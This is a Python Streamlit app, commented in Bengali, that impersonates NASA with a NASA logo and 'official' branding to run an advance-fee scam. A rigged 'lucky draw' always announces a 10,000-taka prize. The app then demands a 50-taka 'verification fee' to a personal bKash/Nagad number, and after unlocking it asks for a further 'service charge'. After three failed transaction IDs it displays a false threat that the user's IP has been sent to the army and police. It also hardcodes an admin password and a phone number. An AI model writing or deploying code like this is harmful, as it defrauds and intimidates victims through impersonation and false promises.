import streamlit as st
import pandas as pd
from datetime import datetime
import time

# --- ১. অল-ডিভাইস রেসপন্সিভ ডিজাইন ও স্টাইল ---
st.set_page_config(page_title="NASA SUPREME MASTER V33", layout="wide")

st.markdown("""
    <style>
    .stApp { background: radial-gradient(circle, #001a1a 0%, #000000 100%); color: white; }
    .header-text { color: #00eaff; text-align: center; text-shadow: 0 0 20px #00eaff; font-family: 'Orbitron'; }
    .nasa-logo { display: block; margin: auto; width: 130px; filter: drop-shadow(0 0 10px #00eaff); }
    .stButton>button { 
        background: linear-gradient(90deg, #00FF00, #008000); 
        color: white; border-radius: 12px; font-weight: bold; width: 100%; height: 3.5em; 
    }
    .lock-box { 
        text-align: center; padding: 30px; border: 2px solid #00eaff; 
        border-radius: 20px; background: rgba(0, 234, 255, 0.05); 
        box-shadow: 0 0 25px #00eaff; max-width: 800px; margin: auto; 
    }
    .security-alert { 
        color: #ff0000; font-weight: bold; text-align: center; 
        border: 3px solid red; padding: 15px; background: rgba(255,0,0,0.1); 
        box-shadow: 0 0 20px red; border-radius: 10px;
    }
    .payment-notice { 
        background: rgba(255, 0, 0, 0.2); border: 2px solid red; 
        color: white; padding: 20px; border-radius: 10px; text-align: center; 
        box-shadow: 0 0 15px red; margin-top: 10px;
    }
    </style>
    """, unsafe_allow_html=True)

# --- ২. মাস্টার সেটিংস (পাসওয়ার্ড, নাম্বার ও ডাটা) ---
OWNER_PASS = "Akash@Owner#2026"  # তোমার গোপন অ্যাডমিন পাসওয়ার্ড
AKASH_NUMBER = "01967840830"    # তোমার বিকাশ ও নগদ নাম্বার
CHARGE_AMOUNT = "৫০ টাকা"        # কাস্টমার ফি

if 'access' not in st.session_state: st.session_state.access = False
if 'logs' not in st.session_state: st.session_state.logs = []
if 'failed' not in st.session_state: st.session_state.failed = 0
if 'my_notes' not in st.session_state: st.session_state.my_notes = ""
if 'valid_ids' not in st.session_state: 
    st.session_state.valid_ids = ["8M29X7PQ", "NASA2026", "AKASH786", "SUCCESS100"]

# --- ৩. মেইন হেডার ও লোগো ---
st.markdown('<img src="https://upload.wikimedia.org/wikipedia/commons/e/e5/NASA_logo.svg" class="nasa-logo">', unsafe_allow_html=True)
st.markdown("<div class='header-text'><h1>🚀 NASA OFFICIAL SUPREME CORE V33</h1><p>Multi-Device Master Server | Secured by Akash</p></div>", unsafe_allow_html=True)

# --- ৪. লাকি ড্র (সবার আগে - কাস্টমারকে আকর্ষণ করার জন্য) ---
if not st.session_state.access:
    st.markdown("### 🎁 NASA SPECIAL LUCKY DRAW")
    st.info("সিস্টেমে ঢোকার আগে আপনার ভাগ্য পরীক্ষা করে ১০,০০০ টাকা জিতে নিন!")
    
    if st.button("🔥 SPIN NOW - চাকা ঘুরান"):
        st.balloons()
        st.success("🎉 অভিনন্দন! আপনি ১০,০০০ টাকা লাকি পুরস্কার জিতেছেন!")
        st.warning(f"এই পুরস্কারের টাকা দাবি করতে এবং মেইন সার্ভার আনলক করতে নিচের নিয়মে {CHARGE_AMOUNT} ভেরিফিকেশন ফি দিন।")

    st.markdown("---")

    # --- ৫. ট্রানজেকশন আইডি (TrxID) পেমেন্ট গেটওয়ে ---
    st.markdown("<div class='lock-box'>", unsafe_allow_html=True)
    st.subheader("🔑 পেমেন্ট ভেরিফাই করে সিস্টেম আনলক করুন")
    
    st.markdown(f"""
        <div style='background: rgba(255,255,255,0.1); padding: 15px; border-radius: 15px; margin-bottom: 15px;'>
        <p style='color: white; font-size: 18px;'>বিকাশ অথবা নগদ (Personal): <b>{AKASH_NUMBER}</b></p>
        <p style='color: #00eaff;'>পাঠানোর পরিমাণ: <b>{CHARGE_AMOUNT}</b></p>
        <p style='font-size: 14px;'>টাকা পাঠানোর পর মেসেজের <b>TrxID</b> নিচে দিয়ে আনলক করুন।</p>
        </div>
    """, unsafe_allow_html=True)
    
    user_trx = st.text_input("আপনার TrxID কোডটি দিন:", placeholder="Ex: 8M29X7PQ").strip()
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("সিস্টেম আনলক করুন 🔓"):
            if user_trx in st.session_state.valid_ids:
                st.session_state.access = True
                st.session_state.logs.append({
                    "সময়": datetime.now().strftime("%I:%M %p"), 
                    "TrxID": user_trx,
                    "তারিখ": datetime.now().strftime("%d-%m-%Y")
                })
                st.success("✅ ভেরিফাইড! আনলক হচ্ছে...")
                time.sleep(1.5)
                st.rerun()
            else:
                st.session_state.failed += 1
                st.error("❌ ভুল Transaction ID! আগে সঠিক নিয়মে টাকা পাঠান।")
    
    with col2:
        if st.button("সহায়তা নিন 📞"):
            st.info(f"কল করুন: {AKASH_NUMBER}")

    # --- ৬. সেনাবাহিনী ও পুলিশ সিকিউরিটি অ্যালার্ট ---
    if st.session_state.failed >= 3:
        st.markdown("<div class='security-alert'>🚨 হ্যাকিং ডিটেক্টেড! সেনাবাহিনী ও পুলিশ সাইবার ইউনিটকে আপনার আইপি পাঠানো হয়েছে।</div>", unsafe_allow_html=True)
        st.image("https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNGJqNmU5b3h6eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JnBvPXYmY3Q9Zw/V4NSRTs3h9XfG/giphy.gif")
    
    st.markdown("</div>", unsafe_allow_html=True)
    st.stop() 

# --- ৭. মূল সার্ভার ড্যাশবোর্ড (আনলক হওয়ার পর) ---
tab1, tab2, tab3, tab4 = st.tabs(["🚀 NASA TOOLS", "📝 MY WORKSPACE", "📊 DATABASE", "🔐 ADMIN PANEL"])

with tab1:
    st.markdown("### 🛰️ নাসা প্রিমিয়াম কমান্ড সেন্টার")
    st.success("আপনার ১০,০০০ টাকা জেতা নিশ্চিত হয়েছে।")
    st.markdown(f"""
        <div class='payment-notice'>
        <h3>💰 পুরস্কার ক্লেইম করুন</h3>
        <p>জেতা টাকা বিকাশে নিতে অতিরিক্ত {CHARGE_AMOUNT} সার্ভিস চার্জ প্রদান করুন।</p>
        <p>বিকাশ/নগদ নাম্বার: <b>{AKASH_NUMBER}</b></p>
        </div>
    """, unsafe_allow_html=True)

with tab2:
    # --- আকাশের নিজস্ব জায়গা ---
    st.markdown("### 📝 আকাশের পার্সোনাল ওয়ার্কস্পেস")
    st.info("আকাশ জান, এখানে তোমার গোপন কাজের নোট বা প্রজেক্ট লিখে সেভ করে রাখতে পারো।")
    st.session_state.my_notes = st.text_area("তোমার নোটগুলো লেখো:", value=st.session_state.my_notes, height=250)
    if st.button("সেভ করুন ✅"):
        st.success("নোটটি সফলভাবে সেভ করা হয়েছে!")

with tab3:
    st.markdown("### 🏦 ইউজার ডাটাবেজ")
    with st.form("user_entry"):
        st.text_input("ইউজার নাম:")
        st.text_area("মেসেজ:")
        st.form_submit_button("সার্ভারে পাঠান")

with tab4:
    # --- অ্যাডমিন কন্ট্রোল প্যানেল ---
    st.subheader("🔐 অ্যাডমিন কন্ট্রোল (আকাশের জন্য)")
    admin_input = st.text_input("মাস্টার পাসওয়ার্ড দিন:", type="password")
    
    if admin_input == OWNER_PASS:
        st.write("### ✅ পেমেন্ট হিস্ট্রি (অডিট লগ):")
        if st.session_state.logs:
            st.table(pd.DataFrame(st.session_state.logs))
        else: st.info("এখনো কোনো নতুন লগ নেই।")
        
        st.markdown("---")
        new_id = st.text_input("নতুন বৈধ TrxID কোড অ্যাড করুন:")
        if st.button("কোড সেভ করুন"):
            st.session_state.valid_ids.append(new_id)
            st.success(f"কোড {new_id} সফলভাবে যোগ হয়েছে।")
    elif admin_input != "":
        st.error("🚨 ভুল পাসওয়ার্ড! এক্সেস ডিনাইড।")

st.markdown("---")
st.caption(f"© 2026 AKASH NASA AI SUPREME | ALL DEVICES SUPPORTED | LAST UPDATE: {datetime.now().date()}")
